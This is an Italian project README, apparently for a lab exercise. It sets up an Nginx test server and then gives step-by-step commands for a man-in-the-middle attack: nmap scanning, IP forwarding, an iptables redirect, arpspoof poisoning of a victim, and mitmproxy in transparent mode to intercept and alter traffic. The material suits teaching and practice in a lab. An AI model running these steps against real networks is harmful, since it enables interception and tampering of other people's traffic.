# Attacco Man-in-the-Middle tramite ARP spoofing
Questo progetto esplora tecniche di attacco Man-in-the-Middle tramite ARP spoofing, con l'obiettivo di intercettare, analizzare e modificare il traffico di rete tra un client e un server.

- [Configurazione del server](#1-configurazione-del-server)
- [Configurazione del MitM](#2-Configurazione-del-MitM)

Want to read this in [English](README_EN.md)?

## 1. Configurazione del server

### 1.1 Installazione di Nginx

```
$ sudo apt install nginx -y
```

### 1.2 Generazione del certificato self-signed
Creare una directory per i certificati SSL:

```
$ sudo mkdir -p /etc/nginx/ssl
```


Generare un certificato self-signed con OpenSSL:

```
$ sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
-keyout /etc/nginx/ssl/nginx-selfsigned.key \
-out /etc/nginx/ssl/nginx-selfsigned.crt
```

**Descrizione dei parametri**:
- `-x509`: crea un certificato in formato x509.
- `-nodes`: disabilita la richiesta di una passphrase per la chiave privata.
- `-days 365`: imposta la durata del certificato a 365 giorni.
- `-newkey rsa:2048`: genera una nuova chiave RSA a 2048 bit.

### 1.3 Configurazione di Nginx

```
$ sudo nano /etc/nginx/sites-available/default
```

Aggiungere la seguente configurazione, sostituendo `<IP_addr>` con l'indirizzo IP del server:

```
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name <IP_addr>;

    # Reindirizzamento da HTTP a HTTPS
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl;
    server_name <IP_addr>;

    ssl_certificate /etc/nginx/ssl/nginx-selfsigned.crt;
    ssl_certificate_key /etc/nginx/ssl/nginx-selfsigned.key;

    location / {
        proxy_pass http://localhost:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

### 1.4 Verifica e riavvio di Nginx
Verificare la configurazione e riavviare il servizio:

```
$ sudo nginx -t
$ sudo systemctl restart nginx
```

### 1.5 Avvio dei container Docker
Clonare la repository e avviare i container:

```
$ git clone https://github.com/SenapeDev/CySec.git
$ cd server
$ docker compose up --build -d
```

### 1.6 Gestione della modalità HTTPS
Per attivare o disattivare HTTPS tramite Makefile:

```
$ make https-on
$ make https-off
```
- `https-on`: attiva il reindirizzamento verso HTTPS.
- `https-off`: disattiva il reindirizzamento HTTPS, tornando a HTTP.
---

## 2. Configurazione del MitM

### 2.1 Installazione di Nmap

```
$ sudo apt install nmap -y
```

### 2.2 Scansione della rete locale con Nmap
Per trovare gli indirizzi l'indirizzo IP dell'host che ospita il sito web all'interno della rete locale, eseguire:

```
$ nmap -p 80,443 --open -sV <IP_range>
```

**Descrizione dei parametri**:
- `-sV` rileva i servizi attivi e tenta di identificare l’applicazione web in esecuzione.
- `--open` mostra solo gli host con porte aperte.
- `<IP_range>` è il range degli indirizzi IP in cui viene effettuata la scansione.

### 2.3 Abilitazione del packet forwarding
Abilitare il packet forwarding per consentire la ritrasmissione dei pacchetti tra server e vittima:

```
# echo 1 > /proc/sys/net/ipv4/ip_forward
```

### 2.4 Configurazione di iptables per la redirezione del traffico
Reindirizzare il traffico HTTP verso la porta 8080 (utilizzata da `mitmproxy`):

```
$ sudo iptables -t nat -A PREROUTING -p tcp -s <src_IP> --dport 80 -j REDIRECT --to-port 8080
```

Questo comando utilizza la tabella `nat` di iptables per redirigere il traffico destinato alla porta 80 all’indirizzo specificato, verso la porta 8080. Le modifiche non sono permanenti e saranno rimosse al riavvio.

### 2.5 Verifica delle regole impostate
Per verificare le regole `iptables` attive:

```
$ sudo iptables -t nat -L -v -n
```

Il comando elenca tutte le regole impostate nella tabella `nat` di iptables con dettagli (`-v`) e senza risoluzione di nomi (`-n`).

### 2.6 Installazione di dsniff
Installare `dsniff` per eseguire l’ARP spoofing:

```
$ sudo apt install dsniff
```

### 2.7 Esecuzione di ARP Poisoning
Utilizzare `arpspoof` per ingannare la vittima e farle credere di comunicare con il server:

```
# arpspoof -i <interface> -t <src_IP> <dest_IP>
```

Questo comando invia pacchetti ARP all'indirizzo IP della vittima (`<src_IP>`) per impostare l'indirizzo `<dest_IP>` (il server impersonato) come mittente, sfruttando l'interfaccia di rete specificata (`<interface>`).

### 2.8 Installazione di Wireshark
Per catturare e analizzare il traffico di rete, installare Wireshark:

```
$ sudo apt install wireshark -y
```


### 2.9 Intercettazione di pacchetti con Wireshark
Avviare Wireshark per catturare il traffico:

```
$ sudo wireshark
```

### 2.10 Installazione di mitmproxy
Installare `mitmproxy` per manipolare le richieste:

```
$ pip install mitmproxy
```

### 2.11 Installazione dello script per mitmproxy
```
$ git clone https://github.com/SenapeDev/CySec.git
```
### 2.12 Intercettazione e modifica delle richieste con mitmproxy
Eseguire `mitmproxy` in modalità trasparente per intercettare e modificare il traffico HTTP:

```
$ cd mitm
$ mitmproxy -s main.py --mode transparent
```

Questo comando avvia `mitmproxy` in modalità trasparente (`--mode transparent`) per intercettare il traffico senza configurazioni sul client.
